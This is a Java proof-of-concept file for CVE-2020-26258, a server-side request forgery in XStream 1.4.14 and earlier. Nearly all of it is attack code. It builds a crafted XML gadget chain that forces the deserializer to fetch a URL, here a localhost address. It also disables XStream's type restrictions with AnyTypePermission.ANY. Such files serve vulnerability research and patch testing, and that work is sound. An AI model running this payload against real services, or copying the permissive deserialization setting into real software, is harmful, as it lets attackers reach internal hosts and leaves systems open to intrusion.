import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.security.AnyTypePermission;

/**
 * SSRF <=1.4.14
 */
public class CVE_2020_26258 {
    public static void main(String[] args) {
        String xml = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='javax.activation.URLDataSource'>\n" +
                "            <url>http://localhost:81/su18/</url>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";

        XStream xstream = new XStream();
        xstream.addPermission(AnyTypePermission.ANY);
        xstream.fromXML(xml);

    }
}
